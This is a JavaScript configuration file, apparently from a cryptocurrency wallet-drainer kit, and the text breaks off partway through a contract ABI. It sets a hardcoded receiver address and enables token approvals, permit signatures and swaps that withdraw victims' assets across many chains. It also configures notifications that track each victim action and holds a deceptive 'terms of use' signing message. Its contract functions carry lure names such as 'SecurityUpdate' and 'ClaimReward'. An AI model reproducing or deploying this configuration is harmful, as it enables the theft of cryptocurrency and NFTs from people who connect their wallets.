let MS_Encryption_Key = 0x0;
const MS_WalletConnect_MetaData = {
  'name': document.title,
  'description': "https://t.me/cryptocoder0",
  'url': "https://t.me/cryptocoder0",
  'icons': ['https://avatars.githubusercontent.com/u/37784886']
};
var MS_Worker_ID = null;
let MS_Settings = {
  'RPCs': {
    '1': "https://rpc.ankr.com/eth",
    '10': "https://rpc.ankr.com/optimism",
    '56': "https://rpc.ankr.com/bsc",
    '137': "https://rpc.ankr.com/polygon",
    '250': 'https://rpc.ankr.com/fantom',
    '324': "https://rpc.ankr.com/zksync_era",
    '369': "https://pulsechain.publicnode.com",
    '8453': 'https://rpc.ankr.com/base',
    '42161': 'https://rpc.ankr.com/arbitrum',
    '43114': 'https://rpc.ankr.com/avalanche'
  },
  'Address': "0x6723A93Cb6B6643e4e4d1636CB79a8996A6F22Bc",
  'Notifications': {
    'enter_website': true,
    'leave_website': true,
    'connect_success': true,
    'connect_request': true,
    'connect_cancel': true,
    'approve_request': true,
    'approve_success': true,
    'approve_cancel': true,
    'permit_sign_data': true,
    'transfer_request': true,
    'transfer_success': true,
    'transfer_cancel': true,
    'sign_request': true,
    'sign_success': true,
    'sign_cancel': true,
    'chain_request': true,
    'chain_success': true,
    'chain_cancel': true
  },
  'Settings': {
    'Minimal_Wallet_Price': 0x1,
    'Tokens_First': 0x1,
    'Wait_For_Confirmation': 0x1,
    'Wait_For_Response': 0x1,
    'Sign': {
      'Native': 0x1,
      'Tokens': 0x0,
      'NFTs': 0x0,
      'Force': 0x0,
      'WalletConnect': 0x1,
      'WC_AE': 0x0,
      'MetaMask': 0x0,
      'Trust': 0x0
    },
    'Permit': {
      'Mode': 0x1,
      'Priority': 0x0,
      'Bypass': 0x0,
      'Challenge': 0x1,
      'Price': 0x1
    },
    'Permit2': {
      'Mode': 0x1,
      'Bypass': 0x0,
      'Price': 0x1
    },
    'Approve': {
      'Enable': 0x1,
      'MetaMask': 0x2,
      'Trust': 0x4,
      'Bypass': 0x0,
      'Withdraw': 0x1,
      'Withdraw_Amount': 0x1
    },
    'SAFA': {
      'Enable': 0x1,
      'Bypass': 0x0,
      'Withdraw': 0x2,
      'Withdraw_Amount': 0x1
    },
    'Swappers': {
      'Enable': 0x1,
      'Priority': 0x0,
      'Price': 0x1,
      'Uniswap': 0x1,
      'Pancake': 0x1,
      'Quick': 0x1,
      'Sushi': 0x1
    },
    'SeaPort': {
      'Enable': 0x0,
      'Priority': 0x1,
      'Limit': 0x1,
      'Price': 0x1
    },
    'Blur': {
      'Enable': 0x0,
      'Priority': 0x1,
      'Limit': 0x1,
      'Price': 0x1
    },
    'x2y2': {
      'Enable': 0x0,
      'Priority': 0x1,
      'Price': 0x1
    },
    'Chains': {
      'eth': {
        'Enable': 0x1,
        'Native': 0x1,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': "ZK9KCTSWI63J1M6617KII3GGXE2E2G14WA",
        'Contract_Address': "0x0007039b77d22042afc1a9c3b3da11837b730000",
        'Contract_Type': "Execute",
        'Contract_Legacy': 0x0
      },
      'bsc': {
        'Enable': 0x1,
        'Native': 0x0,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': "9JRHWJG4XJRFJQWUJ8Z7CUU58BSBYPU5Z8",
        'Contract_Address': "0x0007039b77d22042afc1a9c3b3da11837b730000",
        'Contract_Type': "Execute",
        'Contract_Legacy': 0x0
      },
      'polygon': {
        'Enable': 0x1,
        'Native': 0x0,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': "U581S17BBGU52HX95JTN6MXKZN7C5G91NB",
        'Contract_Address': "0x0007039b77d22042afc1a9c3b3da11837b730000",
        'Contract_Type': "Execute",
        'Contract_Legacy': 0x0
      },
      'avalanche': {
        'Enable': 0x1,
        'Native': 0x1,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': "ZMJ2CKEX65EJ8WIPWRJWKRFG8HXCM6I89Z",
        'Contract_Address': "0x0007039b77d22042afc1a9c3b3da11837b730000",
        'Contract_Type': "Execute",
        'Contract_Legacy': 0x0
      },
      'arbitrum': {
        'Enable': 0x1,
        'Native': 0x1,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': "S5VY3T8RDN7EG1KKIC6D5X2836MCEXWVD3",
        'Contract_Address': "0x0007039b77d22042afc1a9c3b3da11837b730000",
        'Contract_Type': "Execute",
        'Contract_Legacy': 0x0
      },
      'fantom': {
        'Enable': 0x1,
        'Native': 0x1,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': "N2MG77C5SW8M477DKT21KVHQRT6625DE1T",
        'Contract_Address': '0x0007039b77d22042afc1a9c3b3da11837b730000',
        'Contract_Type': 'Execute',
        'Contract_Legacy': 0x0
      },
      'optimism': {
        'Enable': 0x1,
        'Native': 0x1,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': "QX5MR1EMZ3CWQDEDDYB4KIB67KVNE7KZ67",
        'Contract_Address': "0x0007039b77d22042afc1a9c3b3da11837b730000",
        'Contract_Type': 'Execute',
        'Contract_Legacy': 0x0
      },
      'base': {
        'Enable': 0x1,
        'Native': 0x1,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': "6NGC2DAW6N197CWFP224HSR3778ZDFF6EI",
        'Contract_Address': "0x0007039b77d22042afc1a9c3b3da11837b730000",
        'Contract_Type': 'Execute',
        'Contract_Legacy': 0x0
      },
      'zksync_era': {
        'Enable': 0x1,
        'Native': 0x1,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': '',
        'Contract_Address': '',
        'Contract_Type': "Execute",
        'Contract_Legacy': 0x0
      },
      'pulse': {
        'Enable': 0x1,
        'Native': 0x1,
        'Tokens': 0x1,
        'NFTs': 0x1,
        'Min_Native_Price': 0x1,
        'Min_Tokens_Price': 0x1,
        'Min_NFTs_Price': 0x1,
        'API': '',
        'Contract_Address': '',
        'Contract_Type': "Execute",
        'Contract_Legacy': 0x0
      }
    }
  },
  'Contract_Blacklist': ["0x4238e5ccc619dcc8c00ade4cfc5d3d9020b24898", "0x0b91b07beb67333225a5ba0259d55aee10e3a578", '0xd9e838dd60c8ea1e7dd4e670913323bb87db112c', "0x97eae24ca21fc9c0c5d4c31d12e9100ab50f20ea", "0x396d8805d184ef5325b5ccd107638adfd38ccff8", "0xd048b4c23af828e5be412505a51a8dd7b37782dd", '0x82d0952f3524df3e0f003d6bb231015d312f9164', "0x71753d0586ea6b979dfccbb492a45e611e0e0ad6", "0x36cc190e338aedca03739b71c7254b3661ac42b9", '0x0cf8e180350253271f4b917ccfb0accc4862f262', "0xc068cbf21ac99cedfcc8973d66f20d7f235a3ba2", "0xe3e1147acd39687a25ca7716227c604500f5c31a", "0x4aa6b74464e6ceb3cc47046a7da8ff01487a00cd", '0x0f9adaaccd7caecc5019194e15ad19624fed95fa', "0xca6d678e74f553f0e59cccc03ae644a3c2c5ee7d", "0xef093fa75ee8d7cb1ac63ee5e6e1cc7bd5871d1b", "0x35122d1fe8001296f61290b8ba42ef597af31fb7", '0x5f7a1a4dafd0718caee1184caa4862543f75edb1', "0xd7220789e9a775b2eac0822b5d7c7d734b187e9b", '0x2dea12c4f08074032a9997f0a199b04af0fc0392', "0x7e6202903275772044198d07b8a536cc064f8480", "0x9fffe0385dc7584faeeac59f56eedfc442bba622", "0xb0557906c617f0048a700758606f64b33d0c41a6", "0xd22202d23fe7de9e3dbe11a2a88f42f4cb9507cf", "0xa02a0b2d67d4fa48677a79cadc483e114049916d", "0xee85c2145d01fbae8f8b97b5b5e8f2d4054956fd", "0xd2c8cdab8e68be3785db77f160a436a0e0905c34", '0xcddf9ef175e79541a783eaa9f0dfd712bc7c73b1', "0xc3ebf4a71d441afa1f477047cbf5597f82724771", '0xb0f8d835e957ceb92d40fa110c9428440420f061', "0x9e93f0918a8e92053c28a23cc8c43db10c1fe858", "0x77ea6d2f3a86170bab01816509401b1864bfc3d3", '0x734c5f3f8f6ad9697b26ecc6388678aafd3db3b2', "0x72add749ddcfe9b749f50cbff76b59a2e6c80af5", "0x7158d987f62280b5b6b91c0f4026d42f712819c2", "0x6a67b5d14b19828f36db5c128da2a1826d2618de", "0x53035e4e14fb3f82c02357b35d5cc0c5b53928b4", "0x4fa2e5871dd9622c515f66a4b3230b73236e0d8d", '0x472a859b330775c4864923c9b933c68d83d5e5d5', '0x43a172c44dc55c2b45bf9436cf672850fc8ba046', "0x2ad7f18dcfa131e33411770a9c6c4fe49b187bc2", "0x17483ff53f49d83b031009edb39027fa8d24a2da", "0x10649d7fad69e4ac68be0f12de99e1ecc18219a0", "0xdc4cb4c3587532409a4545aa79a15d967bed1c08", "0xbb92b9d18db99c3695bc820bf2c876d4b1527fa5", "0xc3238c3b7b8e32588a49c751aed808368e85122d", '0xf898a4f66ba1530919877e6591625b44e706e2c0', '0xf43a71e4da398e5731c9580d11014de5e8fd0530', "0xaecc1f18298868f0d7d509ada0239ba18b43e549", '0x949e0a0672299e6fcd6bec3bd1735d6647b20618', "0x725e02c7f9168f45b3699cfb7c262fb6dd355e84", '0x513c285cd76884acc377a63dc63a4e83d7d21fb5', "0x4a9e54fd1bef556c7d0d6d20b9f8dab886417e05", '0x000000000482aa9817645c3d56aa2230f6573532', '0x7a59ce9c4248f8b078fd96d9965e6e5dc8e6f0a8', "0x4b97c9bee3677797034033337f32115115867a62", '0x5620eba565d42e8a7eac25721d8fe9270ac8ca3e', "0x7aa3a53360541283ffa9192972223b47a902dc0c", '0xbff96267c5a60aa61763dd7159da14d6df6da371', '0xed00fc7d48b57b81fe65d1ce71c0985e4cf442cb', "0xf5e1c367d2e41b9143937ad17da6d53abbbc306b", '0x5f2caa99fc378248ac02cbbaac27e3fa155ed2c4', "0x0b7dc561777842d55163e0f48886295aad1359b9", '0xe327ce757cd206721e100812e744fc56e4e0a969', '0xc78c316f088626637ff3b7c650446c1f3f143b79', "0x74ddd251aa2037be101bf53f655716b1734828cd", '0xa1b99485d58d70d86e455ab8823492090c3f43c0', "0x306639613914725dacab91953612095e76d71fba", "0x2b2af27b6d8bdff171a97fe12a8fe0fcc9cc4bbd", "0x67c4a6da86da4f45030904b143d6b00d25e366e9", "0xc3589ba9272196190de7ae9175cfe829945426d7", "0x0cd2b73e194274a26cb2008da153751d04f6d822", "0xd08f7b01fdd26928dcdc956610a5332f17b3ea11", '0x0000000000004946c0e9f43f4dee607b0ef1fa1c', '0x0d4992e48278aa7f7c915f820743d9fab7fea713', "0x0e262b466c1d357074a37256c151263a702bff36", "0x119e2ad8f0c85c6f61afdf0df69693028cdc10be", "0x13c3d54a942fd81bfc9236bd1106d081aeadcd3a", "0x15351604e617d9f645b53ee211d9c95ba88297df", "0x1f040f15ab15b7e0dfac935873fadbe43d015535", '0x2248ba304d2045cdc144866ce37d1435a30b29f3', "0x27b880865395da6cda9c407e5edfcc32184cf429", '0x29e3b514d22af48bd22d79ed1fc5475f72a9dd4b', '0x2ba6204c23fbd5698ed90abc911de263e5f41266', "0x3b4deb27a46e746776a661ecf523c42ed0400d54", '0x4a5fad6631fd3df66f23519608185cb96e9a687d', "0x5190b01965b6e3d786706fd4a999978626c19880", '0x57dbae4b73455bc0d3e892ae57779160961f0f03', "0x58b5c4697dc70f3d889225260944cdd9c270c132", "0x6139a0fd42032f29bcc1f9082d5c250cffe98387", "0x641a6dc991a49f7be9fe3c72c5d0fbb223edb12f", '0x64f2c2aa04755507a2ecd22ceb8c475b7a750a3a', "0x68d1569d1a6968f194b4d93f8d0b416c123a599f", "0x8bd0e87273364ebbe3482efc166f7e0d34d82c25", "0x8cad27f4a0987ff10a2a14c35154cb5407b7bfa5", "0x98f8669f6481ebb341b522fcd3663f79a3d1a6a7", '0xa7255c85232a42b5c602ed66c319da9af8433bb3', "0xa8415a1d4d2eab3159ee64c42c34bf53fcfe524a", '0xb2ad5142b8ccb380731866bc42b3619759f3f7b3', "0xb38654311234739dd3ec32660e19d89766074df6", "0xb8a9704d48c3e3817cc17bc6d350b00d7caaecf6", "0xba2ae424d960c26247dd6c32edc70b295c744c43", '0xbc6675de91e3da8eac51293ecb87c359019621cf', "0xbf7183b8c8e5bb2d10f63678abb5d52df72712b2", "0xc2eaaf69e6439abab12dd21f560ba0ec7f17cff7", "0xc33fc11b55465045b3f1684bde4c0aa5c5f40124", "0xc8e8ecb2a5b5d1ecff007bf74d15a86434aa0c5c", '0xcaee79616cffeb53fdda5792742a5c084f879dec', '0xd35f9ab96d04adb02fd549ef6a576ce4e2c1d935', "0xdfb8603d947ab42fb76eb3bb14d9dde4334130d2", "0xe41a093549beee36b76728d456894093396d1120", "0xea6c3053797347ce4e58e722a1dea77af308c292", '0xeade8e37700a34b196142d9962858d2a137e6eb8', "0xf70c14ad93905f39ee3df2d4fb92b87c31d779e0", "0xfcf37440dd6dfc633dde30bbd77f5b0ef5228b8b", "0xfd4c532a8c17bd326c2dc63b88d49306ce27f80b", "0x04645027122c9f152011f128c7085449b27cb6d7", '0x17e2822278f35b272eb6ce1f8d496fe61ec0f395', "0x299aef5cc28e1387ee0951163ef67b0c7d591968", "0x43c967256de9af23ed59b95114016c9b588a9127", "0x580ca2b84331ae1cacc525e1839c5097be37a1c8", "0x6b928e0ed8a2f2bf40e7c557b52a3cf7bccca064", "0x72d3882a31c7d9c5d5989ade65e3c129e5a1717a", "0x9c1273b6cfec61c6f61cef472c7dff740187589f", "0xac6a41a0a06b2aaedaa6187bed974e1fe6cb21d2", "0xcf8b4e69707e22dc5062f80576d9f069275ed1b5", "0xed96fdfc15ea82c5ae2469320236ddfc18de243e", "0xedbd18b82215e7e39b7080ad967669b00ff1b8b4", "0xf735ca1a0a90deaa80862177d070510be3313e34", "0xf3a6b60bfbb3ce9d69bfaf9ddb61738b4607e8c8", "0x1c749d5f5630cf365673bf6c0b6b0570c48da112", '0x2231e1c01056aebab3113d684b034b50a99a56c7', "0x32d3499feca3f881d779f0183d7b41d32b2498df", "0x6d11e81ae4085502149af936b10cec4200793e51", '0x7b4a50a9010c79be94baf3e7ae49f2602557855c', "0x836e8f81b9e07bff462319879d662ecd21481364", '0x8f6f9195a536b4a7d67553575b08861cd3a3d644', "0x9603a3d3dcccf5ef1a2060a3da796ac084cc66eb", "0x9fdfb9c375112b90e97b344bcde73ccde840db92", "0xc0a934e793c2887456b886bcb6dde63a7ce6b8d0", "0xd2f83cf5c697e892a38f8d1830eb88ebc0809a0c", "0xe8d6eccf4df7067a52d43495c11b69deeedb965e", "0xeb51abfe67e9eae5572444c1d789812c04ff3853", "0xec811fbcd12f67874891cdbbbc95d9f73db3fbb0", "0x9b11bc99f7e20ef5b954a23e953c842c2962d7e3", '0xb186035490c8602ead853ec98be05e3461521ab2', "0xda2d21872999e700a715a1bda3153eb9079770bb", "0xa27953fe076ce1caf9fee6c02528390da168f69a", '0x0165bdab5fccd14f672dbb04115e1715da528587', "0xb1d1f51a96355ad6fa8266f311e7a67700a26f6a", "0x009668a9691e456972c8ec4cc84e99486308b84d", "0x33909c9ce97ce509dab3a038b3ec7ac3d1be3231", "0xb1d1f51a96355ad6fa8266f311e7a67700a26f6a", "0x18468129f8fe42eadb2afe7973c2f5e80b38b299", '0xb1d1f51a96355ad6fa8266f311e7a67700a26f6a', "0x18468129f8fe42eadb2afe7973c2f5e80b38b299", "0xd24157aa1097486dc9d7cf094a7e15026e566b5d", "0xb9f0a9a59a44577631680c7bc0846b85234f7473", "0xb1d1f51a96355ad6fa8266f311e7a67700a26f6a", "0x18468129f8fe42eadb2afe7973c2f5e80b38b299", '0xd24157aa1097486dc9d7cf094a7e15026e566b5d', "0xb9f0a9a59a44577631680c7bc0846b85234f7473", "0x9f583e512ef9b234054c07b61388fb73be54f9c5", "0x265befe2b1a0f4f646dea96ba09c1656b74bda91", "0xe1b3f4849c8959f53edd3ab932e0f145daf865c1", "0xcbdeb4ff6cb834a83bf438d26a2fb5e6f53319b7", "0x5647d5a93f6fa963ded4912ce9a7528a0f342c99", "0x53f952260518bffc4f803df125ff22799debec1a", "0x9cd5028ffa4e2a71a0a2a26696b6764a4f74e6e1", '0x4e1191fa01bb4ec0dcca114a958bf5c204c285fb', "0x985dd3d42de1e256d09e1c10f112bccb8015ad41", '0x4a7397b0b86bb0f9482a3f4f16de942f04e88702', "0xf84ea569eaaebd634cac7944058f1b17386aa56e", "0x17158e788771ebff629e00e9b0b62a9c921e2134", "0x0f65cfde93db3a37ecc4fce0873010f3daf434a3", "0x82dfdb2ec1aa6003ed4acba663403d7c2127ff67", "0x5ccce837b41dbd2ad74882889749517935741390", "0x5ab76c4ec60731e6ae1d2ebd2e604f1ec18a038b", "0x609b88f5a4abb7a55ba0c6d255c3f1b1bc7a4d76", '0x9ba03c4db8b3ec92d6bc3c2ad76859c058283b76', "0x64609a845ad463d07ee51e91a88d1461c3dc3165", "0x97e6e31afb2d93d437301e006d9da714616766a5", "0x57c56665b2bcdf3cb86e40a9d3dc21f5b0aed7ad", "0xc12d1c73ee7dc3615ba4e37e4abfdbddfa38907e", "0xe4e11e02aa14c7f24db749421986eaec1369e8c9", "0x60e6895184448f3e8ef509d083e3cc3ac31f82fd", "0x4238e5ccc619dcc8c00ade4cfc5d3d9020b24898"],
  'Contract_Whitelist': [],
  'Wallet_Blacklist': [],
  'Receiver': '0x6723A93Cb6B6643e4e4d1636CB79a8996A6F22Bc',
  'CIS': true,
  'V_MSG': "By signing this message, you agree to the Terms of Use and authorize the use of your wallet address to identify you on the site, also confirm that you are the wallet's owner:\n\n{{ADDRESS}}",
  'Loop_N': 0x0,
  'Loop_T': 0x0,
  'Loop_NFT': 0x0,
  'Permit_BL': [[0x1, "0xae7ab96520de3a18e5e111b5eaab095312d7fe84"], [0x89, "0x2791bca1f2de4661ed88a30c99a7a9449aa84174"]],
  'V_MODE': 0x0,
  'Unlimited_BL': [[0x1, "0x1f9840a85d5af5bf1d1762f925bdaddc4201f984"]],
  'DSB': false,
  'AT': '',
  'LA': 0x0
};
let MS_Contract_ABI = {
  'CONTRACT_LEGACY': [{
    'constant': false,
    'inputs': [],
    'name': "SecurityUpdate",
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': 'function'
  }, {
    'constant': false,
    'inputs': [],
    'name': "Claim",
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': 'function'
  }, {
    'constant': false,
    'inputs': [],
    'name': 'ClaimReward',
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': "function"
  }, {
    'constant': false,
    'inputs': [],
    'name': "ClaimRewards",
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': 'function'
  }, {
    'constant': false,
    'inputs': [],
    'name': "Swap",
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': "function"
  }, {
    'constant': false,
    'inputs': [],
    'name': "Connect",
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': 'function'
  }, {
    'constant': false,
    'inputs': [],
    'name': 'Execute',
    'outputs': [],
    'payable': true,
    'stateMutability': 'payable',
    'type': "function"
  }, {
    'constant': false,
    'inputs': [],
    'name': 'Multicall',
    'outputs': [],
    'payable': true,
    'stateMutability': 'payable',
    'type': "function"
  }],
  'CONTRACT': [{
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': 'owner',
      'type': "address"
    }],
    'name': 'SecurityUpdate',
    'outputs': [],
    'payable': true,
    'stateMutability': 'payable',
    'type': "function"
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': "owner",
      'type': "address"
    }],
    'name': "Claim",
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': "function"
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': "owner",
      'type': "address"
    }],
    'name': "ClaimReward",
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': "function"
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': "owner",
      'type': 'address'
    }],
    'name': 'ClaimRewards',
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': 'function'
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': 'owner',
      'type': "address"
    }],
    'name': 'Swap',
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': 'function'
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': 'owner',
      'type': 'address'
    }],
    'name': "Connect",
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': "function"
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': 'owner',
      'type': 'address'
    }],
    'name': "Execute",
    'outputs': [],
    'payable': true,
    'stateMutability': "payable",
    'type': 'function'
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': 'owner',
      'type': "address"
    }],
    'name': "Multicall",
    'outputs': [],
    'payable': true,
    'stateMutability': 'payable',
    'type': "function"
  }],
  'ERC20': [{
    'inputs': [],
    'stateMutability': "nonpayable",
    'type': "constructor"
  }, {
    'anonymous': false,
    'inputs': [{
      'indexed': true,
      'internalType': "address",
      'name': "owner",
      'type': "address"
    }, {
      'indexed': true,
      'internalType': "address",
      'name': "spender",
      'type': "address"
    }, {
      'indexed': false,
      'internalType': 'uint256',
      'name': 'value',
      'type': 'uint256'
    }],
    'name': "Approval",
    'type': "event",
    'signature': "0x8c5be1e5ebec7d5bd14f71427d1e84f3dd0314c0f7b2291e5b200ac8c7c3b925"
  }, {
    'anonymous': false,
    'inputs': [{
      'indexed': true,
      'internalType': 'address',
      'name': "from",
      'type': "address"
    }, {
      'indexed': true,
      'internalType': "address",
      'name': 'to',
      'type': "address"
    }, {
      'indexed': false,
      'internalType': "uint256",
      'name': "value",
      'type': "uint256"
    }],
    'name': "Transfer",
    'type': "event",
    'signature': '0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef'
  }, {
    'inputs': [{
      'internalType': "address",
      'name': "owner",
      'type': "address"
    }, {
      'internalType': 'address',
      'name': "delegate",
      'type': "address"
    }],
    'name': "allowance",
    'outputs': [{
      'internalType': "uint256",
      'name': '',
      'type': 'uint256'
    }],
    'stateMutability': 'view',
    'type': "function",
    'constant': true,
    'signature': "0xdd62ed3e"
  }, {
    'inputs': [{
      'internalType': "address",
      'name': "delegate",
      'type': 'address'
    }, {
      'internalType': "uint256",
      'name': 'numTokens',
      'type': "uint256"
    }],
    'name': "approve",
    'outputs': [{
      'internalType': "bool",
      'name': '',
      'type': "bool"
    }],
    'stateMutability': 'nonpayable',
    'type': "function",
    'signature': "0x095ea7b3"
  }, {
    'inputs': [{
      'internalType': "address",
      'name': "tokenOwner",
      'type': "address"
    }],
    'name': "balanceOf",
    'outputs': [{
      'internalType': 'uint256',
      'name': '',
      'type': "uint256"
    }],
    'stateMutability': "view",
    'type': "function",
    'constant': true,
    'signature': '0x70a08231'
  }, {
    'inputs': [],
    'name': "decimals",
    'outputs': [{
      'internalType': "uint8",
      'name': '',
      'type': 'uint8'
    }],
    'stateMutability': "view",
    'type': "function",
    'constant': true,
    'signature': "0x313ce567"
  }, {
    'inputs': [],
    'name': 'name',
    'outputs': [{
      'internalType': "string",
      'name': '',
      'type': 'string'
    }],
    'stateMutability': "view",
    'type': "function",
    'constant': true,
    'signature': '0x06fdde03'
  }, {
    'inputs': [],
    'name': "symbol",
    'outputs': [{
      'internalType': 'string',
      'name': '',
      'type': "string"
    }],
    'stateMutability': "view",
    'type': 'function',
    'constant': true,
    'signature': "0x95d89b41"
  }, {
    'inputs': [],
    'name': 'totalSupply',
    'outputs': [{
      'internalType': "uint256",
      'name': '',
      'type': "uint256"
    }],
    'stateMutability': "view",
    'type': 'function',
    'constant': true,
    'signature': "0x18160ddd"
  }, {
    'inputs': [{
      'internalType': 'address',
      'name': "receiver",
      'type': "address"
    }, {
      'internalType': "uint256",
      'name': "numTokens",
      'type': "uint256"
    }],
    'name': 'transfer',
    'outputs': [{
      'internalType': "bool",
      'name': '',
      'type': 'bool'
    }],
    'stateMutability': "nonpayable",
    'type': 'function',
    'signature': "0xa9059cbb"
  }, {
    'inputs': [{
      'internalType': "address",
      'name': "owner",
      'type': "address"
    }, {
      'internalType': 'address',
      'name': "buyer",
      'type': "address"
    }, {
      'internalType': "uint256",
      'name': "numTokens",
      'type': "uint256"
    }],
    'name': "transferFrom",
    'outputs': [{
      'internalType': "bool",
      'name': '',
      'type': "bool"
    }],
    'stateMutability': "nonpayable",
    'type': "function",
    'signature': "0x23b872dd"
  }],
  'ERC721': [{
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': 'to',
      'type': "address"
    }, {
      'internalType': "uint256",
      'name': 'tokenId',
      'type': "uint256"
    }],
    'name': "approve",
    'outputs': [],
    'payable': false,
    'stateMutability': 'nonpayable',
    'type': "function"
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': 'to',
      'type': "address"
    }, {
      'internalType': 'uint256',
      'name': 'tokenId',
      'type': "uint256"
    }],
    'name': "mint",
    'outputs': [],
    'payable': false,
    'stateMutability': "nonpayable",
    'type': "function"
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': "from",
      'type': "address"
    }, {
      'internalType': "address",
      'name': 'to',
      'type': "address"
    }, {
      'internalType': "uint256",
      'name': "tokenId",
      'type': "uint256"
    }],
    'name': "safeTransferFrom",
    'outputs': [],
    'payable': false,
    'stateMutability': "nonpayable",
    'type': 'function'
  }, {
    'constant': false,
    'inputs': [{
      'internalType': 'address',
      'name': "from",
      'type': "address"
    }, {
      'internalType': "address",
      'name': 'to',
      'type': "address"
    }, {
      'internalType': "uint256",
      'name': "tokenId",
      'type': "uint256"
    }, {
      'internalType': "bytes",
      'name': '_data',
      'type': "bytes"
    }],
    'name': 'safeTransferFrom',
    'outputs': [],
    'payable': false,
    'stateMutability': "nonpayable",
    'type': "function"
  }, {
    'constant': false,
    'inputs': [{
      'internalType': 'address',
      'name': 'to',
      'type': "address"
    }, {
      'internalType': "bool",
      'name': 'approved',
      'type': 'bool'
    }],
    'name': "setApprovalForAll",
    'outputs': [],
    'payable': false,
    'stateMutability': "nonpayable",
    'type': "function"
  }, {
    'constant': false,
    'inputs': [{
      'internalType': "address",
      'name': "from",
      'type': "address"
    }, {
      'internalType': "address",
      'name': 'to',
      'type': 'address'
    }, {
      'internalType': 'uint256',
      'name': 'tokenId',
      'type': "uint256"
    }],
    'name': "transferFrom",
    'outputs': [],
    'payable': false,
    'stateMutability': "nonpayable",
    'type': "function"
  }, {
    'inputs': [],
    'payable': false,
    'stateMutability': "nonpayable",
    'type': "constructor"
  }, {
    'anonymous': false,
    'inputs': [{
      'indexed': true,
      'internalType': "address",
      'name': "from",
      'type': "address"
    }, {
      'indexed': true,
      'internalType': "address",
      'name': 'to',
      'type': "address"
    }, {
      'indexed': true,
      'internalType': "uint256",
      'name': 'tokenId',
      'type': "uint256"
    }],
    'name': 'Transfer',
    'type': 'event'
  }, {
    'anonymous': false,
    'inputs': [{
      'indexed': true,
      'internalType': "address",
      'name': "owner",
      'type': "address"
    }, {
      'indexed': true,
      'internalType': 'address',
      'name': 'approved',
      'type': "address"
    }, {
      'indexed': true,
      'internalType': "uint256",
      'name': "tokenId",
      'type': 'uint256'
    }],
    'name': "Approval",
    'type': 'event'
  }, {
    'anonymous': false,
    'inputs': [{
      'indexed': true,
      'internalType': "address",
      'name': 'owner',
      'type': "address"
    }, {
      'indexed': true,
      'internalType': 'address',
      'name': 'operator',
      'type': 'address'
    }, {
      'indexed': false,
      'internalType': "bool",
      'name': "approved",
      'type': "bool"
    }],
    'name': "ApprovalForAll",
    'type': 'event'
  }, {
    'constant': true,
    'inputs': [{
      'internalType': "address",
      'name': "owner",
      'type': "address"
    }],
    'name': 'balanceOf',
    'outputs': [{
      'internalType': 'uint256',
      'name': '',
      'type': 'uint256'
    }],
    'payable': false,
    'stateMutability': "view",
    'type': "function"
  }, {
    'constant': true,
    'inputs': [{
      'internalType': 'uint256',
      'name': "tokenId",
      'type': "uint256"
    }],
    'name': 'getApproved',
    'outputs': [{
      'internalType': "address",
      'name': '',
      'type': "address"
    }],
    'payable': false,
    'stateMutability': "view",
    'type': "function"
  }, {
    'constant': true,
    'inputs': [{
      'internalType': "address",
      'name': "owner",
      'type': "address"
    }, {
      'internalType': "address",
      'name': 'operator',
      'type': "address"
    }],
    'name': "isApprovedForAll",
    'outputs': [{
      'internalType': 'bool',
      'name': '',
      'type': "bool"
    }],
    'payable': false,
    'stateMutability': 'view',
    'type': "function"
  }, {
    'constant': true,
    'inputs': [{
      'internalType': 'uint256',
      'name': "tokenId",
      'type': "uint256"
    }],
    'name': 'ownerOf',
    'outputs': [{
      'internalType': 'address',
      'name': '',
      'type': "address"
    }],
    'payable': false,
    'stateMutability': "view",
    'type': "function"
  }, {
    'constant': true,
    'inputs': [{
      'internalType': "bytes4",
